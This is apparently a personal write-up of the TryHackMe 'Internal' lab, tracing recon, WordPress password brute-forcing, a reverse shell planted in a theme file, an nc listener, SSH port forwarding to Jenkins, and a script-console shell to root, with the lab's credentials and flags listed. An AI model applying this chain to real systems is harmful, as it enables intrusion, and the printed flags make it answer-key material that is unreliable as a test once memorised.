# Internal [internal.thm]
> edit `/etc/hosts` file to set the ip to hostname  
> [reference](https://medium.com/@bamroatbabak/internal-tryhackme-9e691b6e6cfb)

<br>

## recon

- nmap scan
	- found 2 open ports > `ssh@p22` & `http@p80`

- default `Apache2` server page when visited ip
- detected sys from scan > `linux`

- gobuster scan (_main ip_)
	- found 2 intresting subdirectries > `/blog` & `/wordpress`

- `/blog` looks like _wordpress_ powered site

- gobuster scan (_/blog_)
	- `/wp-content`
	- `/wp-includes`
	- `/wp-admin`

- wpscan (_/blog_)
	- wp ver: 5.4.2
	- found username: `admin`

<br>

## hacking

- brute force __wp__ w/ `admin` & `rockyou.txt`
- got login `admin`:`my2boys` for wp admin
- editing `404.php` in __login__ > __appearence__ > __theme editor__ w/ `pentestmonkey`'s _reverse shell_ script
- set up listener (`nc -lnvp 4444`)
- visited `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php` & got reverse shell

- current user: `www-data`
- ran `python3 -c 'import pty;pty.spawn("/bin/bash")'` to get _proper bash shell_
- found user `/home/aubreanna`
- found credentials `aubreanna:bubb13guM!@#123` @ `/opt/wp-save.txt`
- got __flag 1__ > `THM{int3rna1_fl4g_1}` @ `/home/aubreanna`

- found `jenkins.txt` @ `/home/aubreanna` which says `Internal Jenkins service is running on 172.17.0.2:8080`
- it seems like an local service is running @ `172.17.0.2:8080`
- after checking running processes (`ps aux`), got `aubrean+  1524  0.0  0.0   1148     4 ?        Ss   11:37   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh`
- it indicates that a _jenkins service_ is running on the server

- doing port forwarding using ssh: `ssh -L 9999:localhost:8080 aubreanna@10.10.43.21`
- namp scan to see it port forwarded successfully (`nmap -p 9999 localhost -A -sC -sV -o nmap_pf.log`, [results](./nmpa_pf.log))
- found jenkins login page on `localhost:9999`
- brute forced logins `admin:spongebob` ([hydra results](./hydra.log): https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/)
- got _reverse shell_ from __manage jenkins_ > __console scripts__ > pasting java reverse shell (https://notchxor.github.io/oscp-notes/3-Exploiting/6-reverse-shells/)
- found `/opt/note.txt` using `find . -type f -name "*.txt"`
- found root credentials `root:tr0ub13guM!@#123` 
- found __flag 2__ > `THM{d0ck3r_d3str0y3r}` @ `/root`
